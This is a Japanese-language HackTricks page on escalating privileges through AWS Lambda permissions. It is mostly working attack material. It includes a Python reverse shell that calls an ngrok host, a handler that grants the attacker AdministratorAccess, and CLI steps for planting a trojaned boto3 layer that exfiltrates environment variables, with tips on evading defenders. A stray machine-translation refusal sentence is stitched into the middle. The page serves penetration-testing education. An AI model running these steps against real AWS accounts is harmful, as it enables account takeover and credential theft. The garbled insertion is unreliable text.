# AWS - Lambda Privesc

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## lambda

lambdaについての詳細情報:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`,** および **`lambda:InvokeFunction`** の権限を持つユーザーは、選択したプログラミング言語に対応するAWSライブラリをインポートするコードを含む新しいLambda関数に既存のIAMロールを渡すことで**権限昇格を行うことができます**。その後、AWS APIを通じて関数を呼び出すことでコードを実行することができます。

攻撃者はこれを悪用して**リバースシェルを取得し、トークンを盗む**ことができます：

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
Since there is no content provided to translate, I cannot proceed with a translation. Please provide the English text you would like translated into Japanese, while maintaining the markdown and HTML syntax.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Lambda関数自体から**lambdaロールの権限を悪用する**こともできます。
Lambdaロールに十分な権限がある場合、それを使用して自分に管理者権限を付与することができます：
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**潜在的な影響：** 任意のLambdaサービスロールに直接昇格する可能性があります。

{% hint style="danger" %}
**`lambda:InvokeAsync`** が興味深いように見えるかもしれませんが、**実行するためには** `lambda:InvokeFunction` の権限も必要であることに注意してください。
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

前のシナリオと同様に、**`lambda:AddPermission`** 権限を持っている場合、**自分自身に `lambda:InvokeFunction`** 権限を付与することができます。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**潜在的な影響：** 任意のLambdaサービスロールに直接privescします。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`**（おそらく`dynamodb:PutItem`と`dynamodb:CreateTable`も）の権限を持つユーザーは、`lambda:InvokeFunction`権限が**ない**にもかかわらず、既存のIAMロールを新しいLambda関数に**渡すことで**権限を昇格させることができます。この関数には、選択したプログラミング言語に対応するAWSライブラリをインポートするコードが含まれている必要があります。その後、ユーザーは**DynamoDBテーブルを新規作成するか、既存のものを使用して**、そのDynamoDBテーブルを指す**イベントソースマッピングをLambda関数に作成する**必要があります。次に、テーブルにアイテムを入れるか、または他の方法でアイテムが入るのを待つ必要があります。これにより、**Lambda関数が呼び出されます**。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
**Pythonファイルのコード**は、**ターゲットとなるロールを利用します**。例としては、前の方法で使用された同じスクリプトです。

その後のステップは、現在のAWS環境で**DynamoDBが使用されているかどうか**に依存します。**もし**使用されて**いる場合**、Lambda関数のために**イベントソースマッピングを作成する**だけで済みますが、そうでない場合は、以下のコマンドを使用して**ストリーミングが有効なテーブルを作成する**必要があります：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
このコマンドの後、攻撃者は以下のコマンドを使用して、**イベントソースマッピングを作成することにより**、Lambda関数とDynamoDBテーブルを**接続します**：
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda 関数とストリームが接続されたので、攻撃者は **DynamoDB ストリームをトリガーすることで Lambda 関数を呼び出す** ことができます。これは、以下のコマンドを使用して DynamoDB テーブルにアイテムを入れることで、ストリームをトリガーすることによって行うことができます：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
この時点で、Lambda関数が呼び出され、攻撃者はAWSアカウントの管理者になります。

**潜在的な影響:** 指定されたlambdaサービスロールへの直接的な権限昇格。

### `lambda:AddPermission`

この権限を持つ攻撃者は、**自分自身（または他者）に任意の権限を付与することができます**（これにより、リソースへのアクセスを許可するリソースベースのポリシーが生成されます）：

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**潜在的影響：** Lambdaサービスロールに直接昇格し、コードを変更して実行する権限を付与します。

### `lambda:AddLayerVersionPermission`

この権限を持つ攻撃者は、**自分自身（または他人）に`lambda:GetLayerVersion`の権限を付与**することができます。攻撃者はレイヤーにアクセスし、脆弱性や機密情報を探すことができます。

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**潜在的影響：** 機密情報へのアクセスの可能性。

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** 権限を持つ攻撃者は、IAM ロールがアタッチされた既存のLambda関数のコードを更新して、関連するAWSライブラリをそのプログラミング言語でインポートし、そのロールを代表してアクションを実行するようにすることができます。攻撃者は、直接呼び出すことができない場合は、呼び出されるのを待つ必要がありますが、既に存在している場合は、何らかの方法で呼び出される可能性が高いです。
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
関連する **.zip ファイルには、Lambda のロールを利用するコードが含まれています**。例としては、前の方法からのコードスニペットが含まれる可能性があります。

**潜在的な影響：** Lambda サービスロールへの直接の権限昇格。

### `lambda:UpdateFunctionConfiguration`

#### 導入

[**Lambda レイヤー**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) は、コードを Lambda 関数に含めることを可能にしますが、**別々に保存することで**、関数コードを小さく保ち、**複数の関数がコードを共有できます**。

Lambda 内で、Python コードがロードされるパスを次のような関数で確認できます：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
これらが該当する場所です：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

例えば、ライブラリ boto3 は `/var/runtime/boto3`（4番目の位置）から読み込まれます。

#### 悪用

**関数にレイヤーを添付する**には、`lambda:UpdateFunctionConfiguration` 権限のみが必要であり、**レイヤーはアカウント間で共有可能**です。また、正しく上書きするためには、**使用しているライブラリを知る**必要がありますが、この例では、攻撃された関数が boto3 をインポートしていると**仮定します**。

安全のために、ターゲットとなる Lambda ランタイム（Python 3.7）で使用されている boto3 ライブラリの同じバージョンを Pip を使用してインストールします。これにより、ターゲット関数で問題を引き起こす可能性のある違いがないようにします。現在、そのランタイムは boto3 バージョン 1.9.42 を使用しています。

以下のコードを使用して、boto3 バージョン 1.9.42 とその依存関係をローカルの "lambda\_layer" フォルダにインストールします：
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
次に、`/lambda_layer/boto3/__init__.py` を開き、悪意のあるコードを追加します。追加するペイロードは以下のようになります：

![](<../../../.gitbook/assets/image (26).png>)

`requests` は `botocore` からインポートされています。この関数は環境変数を抜き取ります。try-except と 0.1 秒のタイムアウトは、このコードが何も壊さないようにするためにあります。

{% hint style="info" %}
**重要な注意:** 実際のペネトレーションテストでは `from botocore.vendored import requests` を使用しないでください。なぜなら、その関数の CloudWatch ログに「DeprecationWarning」が表示され、防御者によって発見される可能性が高くなるからです。
{% endhint %}

このコードを **ZIP ファイル** にまとめて、**攻撃者アカウントの新しい Lambda レイヤーにアップロード** します。まず「python」フォルダを作成し、そこにライブラリを入れておく必要があります。そうすれば、Lambda にアップロードした時にコードが「/opt/python/boto3」で見つかるようになります。また、レイヤーが Python 3.7 と互換性があり、**レイヤーがターゲット関数と同じリージョンにある**ことを確認してください。それが完了したら、`lambda:AddLayerVersionPermission` を使用して **レイヤーを公開アクセス可能にし**、ターゲットアカウントがそれを使用できるようにします。この API 呼び出しには個人の AWS 資格情報を使用してください。
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
現在、**侵害された資格情報**を使用して、ターゲットのLambda関数「s3-getter」に対して以下のコマンドを実行し、**クロスアカウントLambdaレイヤーをアタッチ**します。
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
次のステップは、自分たちで**関数を呼び出す**ことができる場合はそれを行うか、通常の手段によって**呼び出されるまで待つ**ことです。これはより安全な方法です。

この脆弱性を**より慎重に悪用する方法**は以下で見つけることができます：

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**潜在的な影響：** Lambdaサービスロールへの直接の権限昇格。

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

これらの権限があれば、関数を作成してURLを呼び出して実行することができるかもしれませんが、テストする方法を見つけることができませんでしたので、もしあなたができたら教えてください！

### Lambda MitM

一部のLambdaは、パラメーターでユーザーから**機密情報を受け取る**ことになります。その中の1つでRCEを取得した場合、他のユーザーが送信している情報を抽出することができます。以下で確認してください：

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
